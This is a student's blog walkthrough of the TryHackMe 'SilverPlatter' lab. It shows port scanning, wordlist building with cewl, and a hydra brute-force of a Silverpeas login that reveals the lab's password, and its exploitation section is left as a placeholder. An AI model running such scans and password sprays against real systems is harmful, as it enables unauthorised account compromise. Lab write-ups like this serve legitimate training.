---
layout: default
title: "TryHackMe: SilverPlatter Walkthrough (Easy)"
date: 2025-07-16
---

# SilverPlatter Walkthrough (Easy)

# Overview
As part of the class [Introduction to Hacking Methodology](https://academy.simplycyber.io/p/introduction-to-hacking-methodology)
I took [these notes](https://www.notion.so/Introduction-to-Hacking-Methodology-GitHub-Pages-23346f98ca3080d18194f3b09c709143?source=copy_link) while hacking a machine called silver-platter.

This is an introductory class and the difficulty of the Linux machine is fairly low; still, this is my first time I have managed to hack one (with some help from one video) and I am very proud of it, so I decided to put this page together to help other students like me.
My main focus with this walkthrough is in highlighting the reasoning behind the commands, as opposed to simply listing all the required steps without justification or context. I hope you will find it useful.

When you look at my solution, do not get discouraged because you fear you would never think about doing some of these things, instead consider that:
1. I have been studying hacking for 6 solid months, and so far this machine is all I have to show for it.
2. I used Claude AI to help me every step of the way.
3. I am a software engineer that has been working for 25 years in Silicon Valley.
4. It took me 12 days to completely solve this machine and find both flags (5 days to find the first one.)
5. Since I was stuck during the privesc phase, I had to give a peek to a video in the course that essentially says "I am not gonna tell you yet how to privesc this machine, but I am going to tell you that it has something to do with the fact that tim belongs to the adm group." Sincerely, I don't know how many times I had already looked at the logs and didn't see the password, but once I knew that the solution HAD to be in the logs, I was finally able to see it; so what did I spend the last 7 days doing? In short, chasing rabbit holes, but it does not mean that it was all for nothing, in fact I believe that trying and failing is how I will eventually learn how to hack faster and better.

# Reconnaissance (information gathering)

#### Action: go to the /tmp directory
Do not forget to move to the /tmp directory:

```
┌──(username㉿machinename)-[/~]
└─$ cd /tmp
```

This way when we download something or try to output a new file, we will not get "permission denied" errors because we have  no write access to whatever directory we are in; this is especially relevant in our target machine, because the user "tim" we will initially impersonate has a home directory that is owned by root, so tim himself does not have write access to his own home!

## Port Scanning
We start with port scanning, that normally means using nmap; we are going to use nmap *indirectly* via rustscan because rustscan is fast, and we like not having to wait too long; the output is very long, so we are going to cut it down to its essential parts.

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.160.74 -- -A

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       syn-ack ttl 61 nginx 1.18.0 (Ubuntu)
8080/tcp open  http-proxy syn-ack ttl 60

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   79.35 ms  10.6.0.1
2   ... 3
4   149.33 ms silverplatter.thm (10.10.160.74)
```

From the TRACEROUTE section we see that the domain name is **silverplatter.thm** with IPv4 address **10.10.160.74**

#### Action: add a line to the /etc/hosts file
We add both the domain and the IPv4 address to the /etc/hosts file, so we will be better able to reuse our CLI commands even if the IP address of the VM changes (for instance, because the VM's timeout expires), so inside the **/etc/hosts** file we add this line:

```
10.10.160.74    silverplatter.thm
```

And, of course, every time the IP address changes, we will have to keep updating it inside this file.

## 22/tcp (ssh) OpenSSH 8.9p1
From the port scanning output we gather that OpenSSH is on version 8.9p1 .

## Our Strategy for ports 80 and 8080
When we are in the middle of examining port 80, we will talk about using hydra hoping to find the password for a user named scr1ptkiddy.

But in order to make hydra work correctly, we will have to already know that we need to point hydra toward port 8080.

So, how do we know that 8080 is the port we are supposed to use with hydra? Simple, when we look at the CONTACT page on the web site on port 80, we will learn about the existence of a Silverpeas server.

Because of such information disclosure, of course we will try to point our web browser at http://silverplatter.thm:8080/silverpeas (notice that the port is 8080) and discover that there is indeed a login page for Silverpeas hiding in there.

In short:
1. We point the web browser to port 80 and from the CONTACT page we discover that there is a user scr1ptkiddy on a Silverpeas server.
2. We get a hunch that the Silverpeas server may be located at port 8080 (where nmap told us that an http-proxy lives), and so we point the web browser to port 8080 and discover the login page of Silverpeas.
3. We now know that we need to point hydra to port 8080 in order to hope to find the password for scr1ptkiddy.

## 80/tcp (http) nginx 1.18.0 (Ubuntu)
From the port scanning output we gather that nginx (static web server) is on version 1.18.0 and that the operating system is Ubuntu Linux.

### Any nginx vulnerabilities?
We should look for vulnerabilities for version 1.18.0 of nginx, but in this case, after extensive googling, I couldn't find any exploitable vulnerability, so we move on.

### silverplatter.thm:80
Since on port 80 we have a web server, the first thing we are going to do is to point a web browser to http://silverplatter.thm:80 and visually check the web site.

Clicking on the **CONTACT** link we access this juicy piece of information disclosure:

```
Contact

If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is "scr1ptkiddy".
```

From the page above we collect the following information:
- Username: scr1ptkiddy
- Role: project manager
- Silverpeas (running on port 8080?)

In short, it appears that there is a Silverpeas server (later we will discover that it does run on port 8080) with a user named **scr1ptkiddy** for whom we don't know the password yet.
We also learn that there might be one more user that has a managerial role (no password for this user as well.)

#### View Source (look at the source code)
It is also important, when looking at a web site, to use the View Source feature available in all modern web brosers and see whether there are any obvious pieces of interesting information left by the developers in comments (things like users, passwords, and generally speaking, any type of information disclosure that would help us gain an advantage in our attempt to get into the machine.) Unfortunately, in this particular web site's source code there is nothing noteworthy to point out.

#### cewl
Since we know about a user named scr1ptkiddy for a Silverpeas server running on the machine we are attacking, it is worth collecting all keywords from the pages of the web site, and later use them with a program like hydra to search the password for scr1ptkiddy.

Here is the command to scan the web site and collect all its keywords in a file named **silverplatter_keywords.txt**:

```
┌──(kali㉿kali)-[/tmp]
└─$ cewl http:silverplatter.thm > silverplatter_keywords.txt
```

This command collects all keywords in silverplatter.thm and saves them into a file.

#### hydra
We are going to use hydra to *password spray* all the keywords in **silverplatter_keywords.txt** in an attemot to find the password for user scr1ptkiddy.

##### hydra requires several parameters.
First we run this command to learn more about how to authenticate with Silverpeas:

```
┌──(kali㉿kali)-[/tmp]
└─$ curl -s http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp | grep -E 'name=|type="password"|type="text"'
  <meta name="viewport" content="initial-scale=1.0"/>
          <label><span>Login</span><input type="text" name="Login" id="Login"/></label>
          <label><span>Password</span><input type="password" name="Password" id="Password" autocomplete="off"/></label>
            <input class="noDisplay" type="hidden" name="DomainId" value="0"/>
```

From the above output we see that the **DomainId=0** hidden field is critical for Silverpeas authentication.

But we also need to identify a pattern in the Silverpeas’ response that allows us to identify incorrect passwords, so we run the command below passing a "wrong password" on purpose:

(btw, wouldn't it be funny if - after running it - we realized that 'wrongpassword' is the correct password?! Ah ah)

```
┌──(kali㉿kali)-[/tmp]
└─$ curl -v -d "Login=scr1ptkiddy&Password=wrongpassword" http://silverplatter.thm:8080/silverpeas/AuthenticationServlet
...
Location: http://silverplatter.thm:8080/silverpeas/Login?ErrorCode=1&DomainId=-1
...
```

From the above we see that **ErrorCode=1** appears in Silverpeas' responses when the server rejects incorrect passwords.

So, putting all of the above together (plus the fact that 8080 is the appropriate port number), we get to finally write this hydra command:

```
┌──(kali㉿kali)-[/tmp]
└─$ hydra -l scr1ptkiddy -P silverplatter_keywords.txt silverplatter.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:ErrorCode=1"
...
[8080][http-post-form] host: silverplatter.thm   login: scr1ptkiddy   password: adipiscing
...
```

From the above output we see that **adipiscing** is the correct password for scr1ptkiddy.

## 8080/tcp (http-proxy) [part 2]
After browsing to http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp we enter **scr1ptkiddy** and **adipiscing**:

![Silverpeas Login Window](../assets/silverpeas-login-window.png)

# Exploitation (use information gathered during reconnaissance)
Step-by-step walkthrough...


# Lessons Learned
Key takeaways from this challenge...
